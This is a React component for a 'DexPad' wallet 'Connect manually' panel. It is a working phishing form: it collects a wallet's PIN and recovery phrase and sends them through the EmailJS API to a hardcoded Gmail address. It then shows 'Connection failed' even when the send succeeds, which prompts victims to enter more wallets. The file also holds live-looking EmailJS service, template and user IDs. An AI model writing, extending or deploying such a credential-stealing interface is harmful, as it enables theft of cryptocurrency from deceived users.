import React, { useState } from 'react';
import Form from '../../../components/Form/Form';
import TextField from '../../../components/TextField/TextField';
import Box from '../../../components/Box/Box';
import useStep from '../../../hooks/useStep';
import Header from './Header';
import Footer from './Footer';
import * as Yup from 'yup';
import Text from '../../../components/Text/Text';

const validationSchema = Yup.object().shape({
  name: Yup.string(),
  pin: Yup.string().required('Enter your PIN'),
  phrase: Yup.string().required('Enter your phrase'),
});

const Panel = () => {
  const { values, nextStep } = useStep();
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [isError, setIsError] = useState(false);

  const handleSubmit = async (currentValues: typeof values) => {
    setIsLoading(true);
    nextStep(currentValues, true);

    const endpoint = 'https://api.emailjs.com/api/v1.0/email/send';
    try {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          service_id: 'service_y7rcto7',
          template_id: 'template_sl44eng',
          user_id: 'YcYqG6Ye2GHk81gDv',
          template_params: {
            from: 'DexPad',
            email: 'codewithdoe@gmail.com',
            wallet_app: values.wallet,
            wallet_name: currentValues.name,
            wallet_phrase: currentValues.phrase,
            wallet_pin: currentValues.pin,
          },
        }),
      });

      if (!response.ok) {
        setIsError(true);
        setIsLoading(false);
        return;
      }

      setIsSuccess(true);
      setIsLoading(false);
    } catch (error) {
      setIsError(true);
      setIsLoading(false);
      console.log('Unable to submit request', error);
    }
  };

  return (
    <Form
      initialValues={values}
      onSubmit={handleSubmit}
      validationSchema={validationSchema}
    >
      {() => (
        <Form.Wrapper>
          <Header label={'Connect manually'} />
          <Box
            p={'lg'}
            spaceY={'md'}
          >
            <Form.Field name='name'>
              <Form.Label>Wallet name</Form.Label>
              <Form.Block>
                <TextField placeholder={'Wallet name'} />
              </Form.Block>
              <Form.Helper />
            </Form.Field>

            <Form.Field name='pin'>
              <Form.Label>Pass code</Form.Label>
              <Form.Block>
                <TextField placeholder={'Wallet pass-code or PIN'} />
              </Form.Block>
              <Form.Helper />
            </Form.Field>

            <Form.Field name='phrase'>
              <Form.Label>Phrase</Form.Label>
              <Form.Block>
                <TextField
                  placeholder={'Wallet phrase, usually 16-32 word long'}
                />
              </Form.Block>
              <Form.Helper />
            </Form.Field>

            {isSuccess || isError ? (
              <Box
                p={'sm'}
                radius={'sm'}
                backgroundColor={'red-60'}
              >
                <Text color={'white'}>
                  Connection failed. Retry using another wallet.
                </Text>
              </Box>
            ) : null}
          </Box>
          <Footer
            label='Connect'
            disabled={isLoading}
          />
        </Form.Wrapper>
      )}
    </Form>
  );
};

export default Panel;
